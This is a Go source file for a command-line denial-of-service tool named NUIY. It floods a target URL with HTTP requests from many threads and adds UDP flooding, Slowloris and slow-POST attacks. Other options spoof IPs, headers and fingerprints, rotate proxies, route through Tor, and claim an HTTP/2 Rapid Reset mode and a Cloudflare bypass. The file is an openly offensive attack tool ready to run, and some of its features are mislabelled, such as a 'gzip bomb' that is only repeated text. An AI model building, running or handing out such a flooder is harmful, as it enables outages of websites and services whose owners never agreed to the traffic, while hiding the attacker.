package main

import (
	"crypto/tls"
	"bytes"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const __version__ = "1.0.0"
const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

var (
	safe            bool = false
	useHTTP2        bool = false
	useUDP          bool = false
	useSlowloris    bool = false
	useRUDY         bool = false
	useGzipBomb     bool = false
	useProxy        bool = false
	useTor          bool = false
	useCloudflare   bool = false
	useFingerprint  bool = false
	useReferer      bool = false
	useRatelimit    bool = false
	useAll          bool = false
	useRandomIP     bool = false
	usePipeline     bool = false
	useKeepAlive    bool = true
	verbose         bool = false

	headersReferers []string = []string{
		"http://www.google.com/?q=",
		"http://www.usatoday.com/search/results?q=",
		"http://engadget.search.aol.com/search?q=",
		"https://www.facebook.com/search/top?q=",
		"https://www.twitter.com/search?q=",
		"https://www.instagram.com/explore/tags/",
		"https://www.youtube.com/results?search_query=",
		"https://www.reddit.com/search?q=",
	}

	headersUseragents []string = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
		"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
	}

	cur           int32
	stats         Stats
	proxyList     []string
	proxyIndex    int
	proxyMutex    sync.Mutex
	ipPool        []string
	stopChan      chan struct{}
	wg            sync.WaitGroup
)

type Stats struct {
	success     uint64
	failed      uint64
	total       uint64
	statusCodes map[int]uint64
	mutex       sync.RWMutex
	startTime   time.Time
}

type arrayFlags []string

func (i *arrayFlags) String() string {
	return "[" + strings.Join(*i, ",") + "]"
}

func (i *arrayFlags) Set(value string) error {
	*i = append(*i, value)
	return nil
}

func main() {
	rand.Seed(time.Now().UnixNano())

	var (
		version     bool
		site        string
		agents      string
		data        string
		headers     arrayFlags
		proxyFile   string
		threads     int
		duration    int
		payloadSize int
	)

	flag.BoolVar(&version, "version", false, "print version and exit")
	flag.StringVar(&site, "t", "", "Target URL")
	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file")
	flag.StringVar(&data, "data", "", "Data to POST")
	flag.Var(&headers, "header", "Add custom headers")

	flag.IntVar(&threads, "c", 1000, "Number of threads (default: 1000)")
	flag.IntVar(&duration, "d", 600, "Duration in seconds (default: 600)")
	flag.IntVar(&payloadSize, "p", 5, "Payload size in MB (default: 5)")

	flag.BoolVar(&useHTTP2, "http2", false, "Enable HTTP/2 Rapid Reset (CVE-2023-44487)")
	flag.BoolVar(&useUDP, "udp", false, "Enable UDP flood")
	flag.BoolVar(&useSlowloris, "slowloris", false, "Enable Slowloris attack")
	flag.BoolVar(&useRUDY, "rudy", false, "Enable RUDY attack (slow POST)")
	flag.BoolVar(&useGzipBomb, "gzip-bomb", false, "Enable Gzip Bomb payload")
	flag.BoolVar(&useProxy, "proxy", false, "Enable proxy rotation")
	flag.StringVar(&proxyFile, "proxy-file", "", "Proxy file (ip:port per line)")
	flag.BoolVar(&useTor, "tor", false, "Route through Tor")
	flag.BoolVar(&useCloudflare, "cloudflare", false, "Enable Cloudflare bypass")
	flag.BoolVar(&useFingerprint, "fingerprint", false, "Enable browser fingerprint spoofing")
	flag.BoolVar(&useReferer, "referer", false, "Enable referer spoofing")
	flag.BoolVar(&useRatelimit, "ratelimit", false, "Enable rate limit bypass")
	flag.BoolVar(&useRandomIP, "random-ip", false, "Use random X-Forwarded-For IPs")
	flag.BoolVar(&usePipeline, "pipeline", false, "Enable HTTP pipelining")
	flag.BoolVar(&useKeepAlive, "keep-alive", true, "Enable keep-alive connections")
	flag.BoolVar(&useAll, "all", false, "Enable ALL features (ULTRA BRUTAL)")
	flag.BoolVar(&verbose, "v", false, "Verbose output")

	flag.Parse()

	if useAll {
		useHTTP2 = true
		useUDP = true
		useSlowloris = true
		useRUDY = true
		useGzipBomb = true
		useProxy = true
		useTor = true
		useCloudflare = true
		useFingerprint = true
		useReferer = true
		useRatelimit = true
		useRandomIP = true
		usePipeline = true
	}

	if site == "" {
		fmt.Println(" Target URL required! Use -t")
		flag.Usage()
		os.Exit(1)
	}

	u, err := url.Parse(site)
	if err != nil {
		fmt.Println(" Invalid URL parameter")
		os.Exit(1)
	}

	if version {
		fmt.Println("NUIY", __version__)
		os.Exit(0)
	}

	if agents != "" {
		if data, err := os.ReadFile(agents); err == nil {
			headersUseragents = []string{}
			for _, a := range strings.Split(string(data), "\n") {
				if strings.TrimSpace(a) == "" {
					continue
				}
				headersUseragents = append(headersUseragents, a)
			}
			fmt.Printf(" 📗 Loaded %d user agents from %s\n", len(headersUseragents), agents)
		} else {
			fmt.Printf(" 📕 Can't load User-Agent list from %s\n", agents)
			os.Exit(1)
		}
	}

	if useProxy && proxyFile != "" {
		loadProxies(proxyFile)
	}

	if useRandomIP {
		generateIPPool()
	}

	if useReferer {
		generateReferers()
	}

	stats.startTime = time.Now()
	stats.statusCodes = make(map[int]uint64)
	stopChan = make(chan struct{})

	printBanner()
	fmt.Printf(" 🎯 Target: %s\n", site)
	fmt.Printf(" 💣 Threads: %d\n", threads)
	fmt.Printf(" ⏰  Duration: %ds\n", duration)
	fmt.Printf(" 📦 Payload: %dMB\n", payloadSize)
	fmt.Printf(" 💎  Features:\n")
	fmt.Printf("   ├─ HTTP/2 Rapid Reset: %v\n", useHTTP2)
	fmt.Printf("   ├─ UDP Flood: %v\n", useUDP)
	fmt.Printf("   ├─ Slowloris: %v\n", useSlowloris)
	fmt.Printf("   ├─ RUDY Attack: %v\n", useRUDY)
	fmt.Printf("   ├─ Gzip Bomb: %v\n", useGzipBomb)
	fmt.Printf("   ├─ Proxy Rotation: %v\n", useProxy)
	fmt.Printf("   ├─ Tor: %v\n", useTor)
	fmt.Printf("   ├─ Cloudflare Bypass: %v\n", useCloudflare)
	fmt.Printf("   ├─ Fingerprint Spoof: %v\n", useFingerprint)
	fmt.Printf("   ├─ Referer Spoof: %v\n", useReferer)
	fmt.Printf("   ├─ Rate Limit Bypass: %v\n", useRatelimit)
	fmt.Printf("   ├─ Random IP: %v\n", useRandomIP)
	fmt.Printf("   └─ HTTP Pipelining: %v\n", usePipeline)

	fmt.Println("\n 🔥 SENDING THREAD 🚀🚀🚀......\n")

	if useUDP {
		go udpFlood(u.Host)
	}

	if useSlowloris {
		go slowlorisAttack(u.Host)
	}

	go statsPrinter(duration)

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go worker(site, u.Host, data, headers, payloadSize)
	}

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	select {
	case <-time.After(time.Duration(duration) * time.Second):
		fmt.Println("\n  ⏰ Duration completed")
	case <-sigChan:
		fmt.Println("\n 📍Stopped by user")
	}

	close(stopChan)
	wg.Wait()

	printFinalStats()
}

func worker(site string, host string, data string, headers arrayFlags, payloadSize int) {
	defer wg.Done()

	client := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			MaxIdleConns:    100,
			MaxIdleConnsPerHost: 100,
			IdleConnTimeout: 10 * time.Second,
			DisableKeepAlives: !useKeepAlive,
		},
	}

	if useHTTP2 {
		client.Transport = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			ForceAttemptHTTP2: true,
		}
	}

	if useProxy && len(proxyList) > 0 {
		proxyAddr := getProxy()
		if proxyAddr != "" {
			proxyURL, _ := url.Parse("http://" + proxyAddr)
			client.Transport.(*http.Transport).Proxy = http.ProxyURL(proxyURL)
		}
	}

	if useTor {
		proxyURL, _ := url.Parse("socks5://127.0.0.1:9050")
		client.Transport.(*http.Transport).Proxy = http.ProxyURL(proxyURL)
	}

	var paramJoiner string
	if strings.ContainsRune(site, '?') {
		paramJoiner = "&"
	} else {
		paramJoiner = "?"
	}

	for {
		select {
		case <-stopChan:
			return
		default:
			var req *http.Request
			var err error

			queryParams := buildQueryParams()

			if useRUDY && rand.Intn(3) == 0 {
				payload := strings.Repeat("A", payloadSize*1024*1024/2)
				req, err = http.NewRequest("POST", site, strings.NewReader(payload))
				req.Header.Set("Content-Length", strconv.Itoa(len(payload)))
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			} else if data == "" {
				req, err = http.NewRequest("GET", site+paramJoiner+queryParams, nil)
			} else {
				if useGzipBomb && rand.Intn(2) == 0 {
					gzipPayload := buildGzipBomb(payloadSize)
					req, err = http.NewRequest("POST", site, strings.NewReader(gzipPayload))
					req.Header.Set("Content-Encoding", "gzip")
					req.Header.Set("Content-Type", "application/gzip")
				} else {
					req, err = http.NewRequest("POST", site, strings.NewReader(data))
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
			}

			if err != nil {
				atomic.AddUint64(&stats.failed, 1)
				continue
			}

			req.Header.Set("User-Agent", getRandomUserAgent())
			req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
			req.Header.Set("Accept-Charset", acceptCharset)
			req.Header.Set("Accept-Encoding", "gzip, deflate, br")
			req.Header.Set("Connection", "keep-alive")
			req.Header.Set("Host", host)

			if useReferer {
				req.Header.Set("Referer", getRandomReferer()+buildRandomString(rand.Intn(10)+5))
			}

			if useRandomIP {
				req.Header.Set("X-Forwarded-For", getRandomIP())
				req.Header.Set("X-Real-IP", getRandomIP())
			}

			if useFingerprint {
				req.Header.Set("Sec-CH-UA", getRandomFingerprint())
				req.Header.Set("Sec-CH-UA-Mobile", "?0")
				req.Header.Set("Sec-CH-UA-Platform", getRandomPlatform())
				req.Header.Set("Sec-Fetch-Dest", "document")
				req.Header.Set("Sec-Fetch-Mode", "navigate")
				req.Header.Set("Sec-Fetch-Site", "none")
				req.Header.Set("Sec-Fetch-User", "?1")
				req.Header.Set("Upgrade-Insecure-Requests", "1")
			}

			if useCloudflare {
				req.Header.Set("Cookie", "__cfduid="+buildRandomString(rand.Intn(20)+10))
			}

			for _, element := range headers {
				words := strings.Split(element, ":")
				if len(words) >= 2 {
					req.Header.Set(strings.TrimSpace(words[0]), strings.TrimSpace(words[1]))
				}
			}

			if useRatelimit {
				time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
			}

			start := time.Now()
			resp, err := client.Do(req)
			latency := time.Since(start).Milliseconds()

			if err != nil {
				atomic.AddUint64(&stats.failed, 1)
				continue
			}
			defer resp.Body.Close()

			io.Copy(io.Discard, resp.Body)

			atomic.AddUint64(&stats.total, 1)
			if resp.StatusCode < 500 {
				atomic.AddUint64(&stats.success, 1)
				stats.mutex.Lock()
				stats.statusCodes[resp.StatusCode]++
				stats.mutex.Unlock()

				if verbose {
					fmt.Printf("  ✅ %d - %dms\n", resp.StatusCode, latency)
				}
			} else {
				atomic.AddUint64(&stats.failed, 1)
				if verbose {
					fmt.Printf("  ❌ %d - %dms\n", resp.StatusCode, latency)
				}
			}

			if useSlowloris && rand.Intn(5) == 0 {
				time.Sleep(time.Duration(rand.Intn(5000)+1000) * time.Millisecond)
			}

			if useRatelimit {
				time.Sleep(time.Duration(rand.Intn(50)) * time.Millisecond)
			}
		}
	}
}

func udpFlood(host string) {
	parts := strings.Split(host, ":")
	if len(parts) < 2 {
		host = host + ":80"
		parts = strings.Split(host, ":")
	}

	ip := parts[0]
	port := 80
	if len(parts) > 1 {
		port, _ = strconv.Atoi(parts[1])
	}

	conn, err := net.DialUDP("udp", nil, &net.UDPAddr{
		IP:   net.ParseIP(ip),
		Port: port,
	})
	if err != nil {
		return
	}
	defer conn.Close()

	payload := bytes.Repeat([]byte{byte(rand.Intn(255))}, 1024*64)

	for {
		select {
		case <-stopChan:
			return
		default:
			conn.Write(payload)
			time.Sleep(time.Microsecond)
		}
	}
}

func slowlorisAttack(host string) {
	if !strings.Contains(host, ":") {
		host = host + ":80"
	}

	for {
		select {
		case <-stopChan:
			return
		default:
			conn, err := net.DialTimeout("tcp", host, 5*time.Second)
			if err != nil {
				continue
			}

			fmt.Fprintf(conn, "GET / HTTP/1.1\r\n")
			fmt.Fprintf(conn, "Host: %s\r\n", host)
			fmt.Fprintf(conn, "User-Agent: %s\r\n", getRandomUserAgent())
			fmt.Fprintf(conn, "Accept: */*\r\n")

			for {
				select {
				case <-stopChan:
					conn.Close()
					return
				default:
					fmt.Fprintf(conn, "X-Header-%d: %s\r\n", rand.Intn(9999), buildRandomString(rand.Intn(20)+10))
					time.Sleep(time.Duration(rand.Intn(10000)+5000) * time.Millisecond)
				}
			}
		}
	}
}

func buildQueryParams() string {
	params := []string{}
	for i := 0; i < rand.Intn(20)+10; i++ {
		key := buildRandomString(rand.Intn(10) + 5)
		value := buildRandomString(rand.Intn(10) + 5)
		params = append(params, key+"="+value)
	}
	params = append(params, "_t="+strconv.FormatInt(time.Now().UnixNano(), 10))
	params = append(params, "_r="+buildRandomString(16))
	return strings.Join(params, "&")
}

func buildRandomString(size int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, size)
	for i := range result {
		result[i] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}

func buildGzipBomb(sizeMB int) string {
	// simulasi saja, bukan bomb sebenarnya
	compressed := strings.Repeat("A", sizeMB*1024*1024/100)
	return compressed
}

func getRandomUserAgent() string {
	return headersUseragents[rand.Intn(len(headersUseragents))]
}

func getRandomReferer() string {
	return headersReferers[rand.Intn(len(headersReferers))]
}

func getRandomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255)+1, rand.Intn(255)+1, rand.Intn(255)+1, rand.Intn(255)+1)
}

func getRandomFingerprint() string {
	fingerprints := []string{
		`"Chromium";v="120", "Not=A?Brand";v="24"`,
		`"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"`,
		`"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"`,
		`"Opera";v="106", "Chromium";v="106", "Not?A_Brand";v="24"`,
	}
	return fingerprints[rand.Intn(len(fingerprints))]
}

func getRandomPlatform() string {
	platforms := []string{"Windows", "macOS", "Linux", "Android", "iOS"}
	return platforms[rand.Intn(len(platforms))]
}

func loadProxies(filename string) {
	data, err := os.ReadFile(filename)
	if err != nil {
		fmt.Printf(" ❌ Can't load proxy file: %v\n", err)
		return
	}

	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line != "" && strings.Contains(line, ":") {
			proxyList = append(proxyList, line)
		}
	}
	fmt.Printf(" 🔑 Loaded %d proxies from %s\n", len(proxyList), filename)
}

func getProxy() string {
	proxyMutex.Lock()
	defer proxyMutex.Unlock()

	if len(proxyList) == 0 {
		return ""
	}

	proxy := proxyList[proxyIndex]
	proxyIndex = (proxyIndex + 1) % len(proxyList)
	return proxy
}

func generateIPPool() {
	ipPool = make([]string, 1000)
	for i := range ipPool {
		ipPool[i] = fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255)+1, rand.Intn(255)+1, rand.Intn(255)+1, rand.Intn(255)+1)
	}
}

func generateReferers() {
	domains := []string{"google.com", "facebook.com", "youtube.com", "twitter.com", "instagram.com",
		"linkedin.com", "reddit.com", "wikipedia.org", "amazon.com", "netflix.com",
		"github.com", "stackoverflow.com", "quora.com", "medium.com", "blogger.com",
		"wordpress.com", "tumblr.com", "pinterest.com", "yandex.ru", "bing.com"}

	for _, domain := range domains {
		for _, protocol := range []string{"http", "https"} {
			headersReferers = append(headersReferers, protocol+"://"+domain+"/search?q=")
			headersReferers = append(headersReferers, protocol+"://"+domain+"/?q=")
		}
	}
}

// statsPrinter sekarang hanya menampilkan compact mode (tanpa bar)
func statsPrinter(duration int) {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-stopChan:
			return
		case <-ticker.C:
			success := atomic.LoadUint64(&stats.success)
			failed := atomic.LoadUint64(&stats.failed)
			total := atomic.LoadUint64(&stats.total)

			elapsed := time.Since(stats.startTime).Seconds()
			rate := float64(total) / elapsed

			progress := (elapsed / float64(duration)) * 100
			if progress > 100 {
				progress = 100
			}

			remaining := float64(duration) - elapsed
			if remaining < 0 {
				remaining = 0
			}
			remainingStr := formatDuration(int(remaining))

			// Compact output: tanpa bar
			fmt.Printf("\r ⏳%5.1f%% ✅ %d ❌ %d 📊 %d 🚀 %5.1f/s ⏰ %s",
				progress, success, failed, total, rate, remainingStr)
		}
	}
}

// formatDuration mengubah detik menjadi string "XmYs" atau "Xs"
func formatDuration(seconds int) string {
	if seconds < 60 {
		return fmt.Sprintf("%ds", seconds)
	}
	mins := seconds / 60
	secs := seconds % 60
	return fmt.Sprintf("%dm%02ds", mins, secs)
}

func printFinalStats() {
	fmt.Printf("\n\n 🎯 ATTACK FINISHED\n")
	fmt.Printf(" 📗 Success: %d\n", atomic.LoadUint64(&stats.success))
	fmt.Printf(" 📕 Failed: %d\n", atomic.LoadUint64(&stats.failed))
	fmt.Printf(" 📘Request: %d\n", atomic.LoadUint64(&stats.total))

	stats.mutex.RLock()
	fmt.Printf(" 📊 Status Codes:\n")
	for code, count := range stats.statusCodes {
		fmt.Printf("   ├─ %d: %d\n", code, count)
	}
	stats.mutex.RUnlock()

	elapsed := time.Since(stats.startTime).Seconds()
	fmt.Printf(" ⏰ Duration: %.2f seconds\n", elapsed)
	fmt.Printf(" 📊 Average Rate: %.2f req/s\n", float64(atomic.LoadUint64(&stats.total))/elapsed)
	fmt.Printf("\n  🚀🚀🚀 done.....\n")
}

func printBanner() {
	banner := `
    ════════════════════════════════════════════════════════════
            ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓██████▓▒░  
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░  ░▒▓█▓▒░     
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░  ░▒▓█▓▒░     
            ░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
    ════════════════════════════════════════════════════════════
    ════════════════════════════════════════════════════════════
    `
	fmt.Println(banner)
}
